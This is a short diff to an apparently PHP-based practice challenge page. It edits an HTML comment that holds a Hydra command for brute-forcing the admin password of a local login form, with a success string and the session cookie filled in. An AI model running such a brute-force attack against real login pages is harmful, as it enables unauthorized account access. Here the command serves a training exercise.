@@ -126,4 +126,4 @@ if (isset($_POST['submit'])) {
 
 </html>
 
-<!-- .\hydra.exe -t 25 -I -V -l admin -P .\passlist.txt -s 8080 localhost http-post-form "/challenges/bruteforce/index.php:username=admin&password=^PASS^&submit=Login:Wrong Password"
+<!-- .\hydra.exe -t 25 -I -V -l admin -P passlist.txt -s 8080 localhost http-post-form "/challenges/bruteforce/:username=admin&password=^PASS^&submit=Login:S=You found the correct:H=Cookie: PHPSESSID=<?= $_COOKIE['PHPSESSID'] ?>" -->
